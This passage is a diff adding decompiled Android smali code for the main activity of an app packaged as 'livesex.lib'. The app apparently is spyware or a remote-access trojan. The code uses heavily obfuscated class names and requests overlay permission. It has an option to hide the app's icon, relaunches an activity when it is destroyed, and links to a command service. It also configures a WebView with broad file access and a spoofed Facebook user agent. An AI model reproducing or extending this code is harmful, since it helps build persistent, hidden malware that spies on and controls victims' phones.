+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getPackageName()Ljava/lang/String;
+
+    move-result-object v12
+
+    invoke-virtual {v8, v12}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;
+
+    move-result-object v8
+
+    const/16 v12, 0x40
+
+    .line 533
+    invoke-static {v9, v8, v12, v12}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->resizeIcon(Landroid/content/Context;Landroid/graphics/drawable/Drawable;II)Landroid/graphics/drawable/Drawable;
+
+    move-result-object v8
+
+    .line 534
+    invoke-virtual {v6, v8}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;
+
+    const v8, 0x7f0c0043
+
+    .line 535
+    invoke-virtual {v0, v8}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-virtual {v6, v8}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+    :try_end_1d2
+    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1b3 .. :try_end_1d2} :catch_1d2
+    .catch Ljava/lang/Exception; {:try_start_1b3 .. :try_end_1d2} :catch_1df
+
+    .line 542
+    :catch_1d2
+    :try_start_1d2
+    new-instance v8, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$7;
+
+    invoke-direct {v8, v0, v10, v9}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$7;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/AutoStart;Landroid/content/Context;)V
+
+    invoke-virtual {v6, v7, v8}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+
+    .line 554
+    invoke-virtual {v6}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;
+    :try_end_1dd
+    .catch Ljava/lang/Exception; {:try_start_1d2 .. :try_end_1dd} :catch_1df
+
+    goto :goto_1df
+
+    :catch_1de
+    :cond_1de
+    const/4 v11, 0x3
+
+    .line 563
+    :catch_1df
+    :goto_1df
+    :try_start_1df
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v6
+
+    invoke-virtual {v0, v6}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->Work(Landroid/content/Context;)V
+
+    .line 565
+    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v7, 0x17
+
+    if-lt v6, v7, :cond_204
+
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->NeedSuper()Z
+
+    move-result v6
+
+    if-nez v6, :cond_204
+
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->ASKDRAW()Z
+
+    move-result v6
+
+    if-eqz v6, :cond_204
+
+    invoke-static/range {p0 .. p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z
+
+    move-result v6
+
+    if-nez v6, :cond_204
+
+    .line 567
+    invoke-direct/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->AskDraw()V
+    :try_end_201
+    .catch Ljava/lang/Exception; {:try_start_1df .. :try_end_201} :catch_203
+
+    goto :goto_204
+
+    :catch_202
+    const/4 v11, 0x3
+
+    :catch_203
+    nop
+
+    .line 578
+    :cond_204
+    :goto_204
+    sget-object v6, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/initializeService;->HideType:Ljava/lang/String;
+
+    const-string v7, "K"
+
+    invoke-virtual {v6, v7}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_219
+
+    .line 580
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v1
+
+    invoke-static {v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->Swapgbhqcqkcoboqrphppiaomtxkmgsjbgkptzbwimwueguloyrfhx53Me(Landroid/content/Context;)V
+
+    .line 581
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->finish()V
+
+    return-void
+
+    .line 586
+    :cond_219
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v6
+
+    invoke-direct {v0, v6}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->isinternetOK(Landroid/content/Context;)Z
+
+    move-result v6
+
+    if-nez v6, :cond_2a5
+
+    const v6, 0x7f0a0020
+
+    .line 588
+    invoke-virtual {v0, v6}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->setContentView(I)V
+
+    const v6, 0x7f080062
+
+    .line 589
+    invoke-virtual {v0, v6}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->findViewById(I)Landroid/view/View;
+
+    move-result-object v6
+
+    check-cast v6, Landroid/widget/TextView;
+
+    .line 590
+    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;
+
+    move-result-object v7
+
+    invoke-virtual {v7}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;
+
+    move-result-object v7
+
+    .line 591
+    invoke-virtual {v7}, Ljava/lang/String;->hashCode()I
+
+    invoke-virtual {v7}, Ljava/lang/String;->hashCode()I
+
+    move-result v8
+
+    sparse-switch v8, :sswitch_data_3ca
+
+    :goto_244
+    const/4 v5, -0x1
+
+    goto :goto_267
+
+    :sswitch_246
+    invoke-virtual {v7, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_24d
+
+    goto :goto_244
+
+    :cond_24d
+    const/4 v5, 0x3
+
+    goto :goto_267
+
+    :sswitch_24f
+    invoke-virtual {v7, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_256
+
+    goto :goto_244
+
+    :cond_256
+    const/4 v5, 0x2
+
+    goto :goto_267
+
+    :sswitch_258
+    invoke-virtual {v7, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_267
+
+    goto :goto_244
+
+    :sswitch_25f
+    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_266
+
+    goto :goto_244
+
+    :cond_266
+    const/4 v5, 0x0
+
+    :cond_267
+    :goto_267
+    packed-switch v5, :pswitch_data_3dc
+
+    const-string v1, "no internet connection detected.\n\n please connect to internet and try again"
+
+    .line 609
+    invoke-virtual {v6, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
+
+    goto :goto_287
+
+    :pswitch_270  #0x3
+    const-string v1, "未检测到 Internet 连接。\n\n 请连接到 Internet 并重试"
+
+    .line 601
+    invoke-virtual {v6, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
+
+    goto :goto_287
+
+    :pswitch_276  #0x2
+    const-string v1, "internet bağlantısı algılanmadı.\n\n lütfen internete bağlanın ve tekrar deneyin"
+
+    .line 605
+    invoke-virtual {v6, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
+
+    goto :goto_287
+
+    :pswitch_27c  #0x1
+    const-string v1, "No internet connection detected.\n\n please connect to internet and try again"
+
+    .line 593
+    invoke-virtual {v6, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
+
+    goto :goto_287
+
+    :pswitch_282  #0x0
+    const-string v1, "لم يتم الكشف عن اتصال بالإنترنت .\n\n الرجاء الاتصال بالإنترنت والمحاولة مرة أخرى"
+
+    .line 597
+    invoke-virtual {v6, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
+
+    :goto_287
+    const v1, 0x7f080064
+
+    .line 615
+    invoke-virtual {v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->findViewById(I)Landroid/view/View;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/widget/ImageView;
+
+    .line 616
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->Oklistner:Landroid/view/View$OnClickListener;
+
+    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V
+
+    const v1, 0x7f080030
+
+    .line 618
+    invoke-virtual {v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->findViewById(I)Landroid/view/View;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/widget/Button;
+
+    .line 619
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->out:Landroid/view/View$OnClickListener;
+
+    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
+
+    goto/16 :goto_3c8
+
+    .line 623
+    :cond_2a5
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->AskDatausage()Z
+
+    move-result v1
+
+    if-eqz v1, :cond_2c5
+
+    .line 624
+    new-instance v1, Landroid/content/Intent;
+
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v2
+
+    const-class v3, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/RequestDataUsage;
+
+    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    const/high16 v2, 0x10000000
+
+    .line 625
+    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    move-result-object v1
+
+    const/high16 v2, 0x800000
+
+    .line 626
+    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    move-result-object v1
+
+    .line 624
+    invoke-virtual {v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->startActivity(Landroid/content/Intent;)V
+
+    .line 632
+    :cond_2c5
+    :try_start_2c5
+    invoke-virtual/range {p0 .. p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getWindow()Landroid/view/Window;
+
+    move-result-object v1
+
+    const/high16 v2, 0x1000000
+
+    invoke-virtual {v1, v2, v2}, Landroid/view/Window;->setFlags(II)V
+    :try_end_2ce
+    .catch Ljava/lang/Exception; {:try_start_2c5 .. :try_end_2ce} :catch_2ce
+
+    :catch_2ce
+    const v1, 0x7f0a0030
+
+    .line 639
+    invoke-virtual {v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->setContentView(I)V
+
+    const v1, 0x7f0800a6
+
+    .line 640
+    invoke-virtual {v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->findViewById(I)Landroid/view/View;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/webkit/WebView;
+
+    iput-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    .line 641
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
+
+    .line 643
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V
+
+    .line 644
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V
+
+    .line 645
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V
+
+    .line 646
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    const/4 v2, 0x0
+
+    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setScrollBarStyle(I)V
+
+    .line 647
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
+
+    .line 648
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setCacheMode(I)V
+
+    .line 649
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
+
+    .line 650
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V
+
+    .line 651
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V
+
+    .line 652
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v1
+
+    invoke-virtual {v1, v5}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V
+
+    const/4 v1, 0x0
+
+    .line 655
+    :try_start_33e
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    const/4 v3, 0x2
+
+    invoke-virtual {v2, v3, v1}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V
+
+    .line 656
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v2
+
+    sget-object v3, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V
+
+    .line 657
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v2
+
+    sget-object v3, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V
+
+    .line 658
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v2
+
+    invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setEnableSmoothTransition(Z)V
+
+    .line 659
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    const/4 v3, -0x1
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setBackgroundColor(I)V
+    :try_end_369
+    .catch Ljava/lang/Exception; {:try_start_33e .. :try_end_369} :catch_36a
+
+    goto :goto_36b
+
+    :catch_36a
+    nop
+
+    .line 662
+    :goto_36b
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v2
+
+    const/4 v3, 0x0
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V
+
+    const-string v2, ""
+
+    .line 665
+    iput-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->value:Ljava/lang/String;
+
+    const-string v3, "google.com"
+
+    .line 667
+    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v2
+
+    if-nez v2, :cond_398
+
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->value:Ljava/lang/String;
+
+    const-string v3, "youtube.com"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v2
+
+    if-eqz v2, :cond_38c
+
+    goto :goto_398
+
+    .line 674
+    :cond_38c
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v2
+
+    const-string v3, "Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]"
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V
+
+    goto :goto_3a3
+
+    .line 669
+    :cond_398
+    :goto_398
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+
+    move-result-object v2
+
+    const-string v3, "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36"
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V
+
+    .line 678
+    :goto_3a3
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    new-instance v3, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$8;
+
+    invoke-direct {v3, v0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$8;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setDownloadListener(Landroid/webkit/DownloadListener;)V
+
+    .line 700
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    new-instance v3, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$MyChrome;
+
+    invoke-direct {v3, v0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$MyChrome;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V
+
+    .line 701
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    new-instance v3, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$MyWebViewClient;
+
+    invoke-direct {v3, v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$MyWebViewClient;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$1;)V
+
+    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V
+
+    .line 706
+    iget-object v1, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    iget-object v2, v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->value:Ljava/lang/String;
+
+    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
+
+    :goto_3c8
+    return-void
+
+    nop
+
+    :sswitch_data_3ca
+    .sparse-switch
+        0xc31 -> :sswitch_25f
+        0xca9 -> :sswitch_258
+        0xe7e -> :sswitch_24f
+        0xf2e -> :sswitch_246
+    .end sparse-switch
+
+    :pswitch_data_3dc
+    .packed-switch 0x0
+        :pswitch_282  #00000000
+        :pswitch_27c  #00000001
+        :pswitch_276  #00000002
+        :pswitch_270  #00000003
+    .end packed-switch
+.end method
+
+.method protected onDestroy()V
+    .registers 4
+
+    .line 773
+    sget-boolean v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/CommandsService;->echo:Z
+
+    if-eqz v0, :cond_f
+
+    .line 775
+    sget-object v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->ActiveNow:Ljava/lang/String;
+
+    const-string v1, " "
+
+    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/CommandsService;->hosekwdxargicianwmuveyamresdiantmtmzkhgiyjrdxirsiu52(Ljava/lang/String;[B)V
+
+    .line 777
+    :cond_f
+    invoke-static {}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/flyActivity;->isActivityOpen()Z
+
+    move-result v0
+
+    if-nez v0, :cond_28
+
+    .line 778
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v0
+
+    .line 779
+    new-instance v1, Landroid/content/Intent;
+
+    const-class v2, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/flyActivity;
+
+    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    const/high16 v2, 0x10000000
+
+    .line 780
+    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 781
+    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    .line 783
+    :cond_28
+    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V
+
+    return-void
+.end method
+
+.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
+    .registers 3
+
+    .line 128
+    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V
+
+    .line 129
+    iget-object v0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    if-eqz v0, :cond_a
+
+    .line 131
+    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;
+
+    :cond_a
+    return-void
+.end method
+
+.method protected onResume()V
+    .registers 4
+
+    .line 382
+    invoke-super {p0}, Landroid/app/Activity;->onResume()V
+
+    .line 383
+    sget-boolean v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->forautostart:Z
+
+    if-eqz v0, :cond_31
+
+    const/4 v0, 0x0
+
+    .line 384
+    sput-boolean v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->forautostart:Z
+
+    .line 385
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v0
+
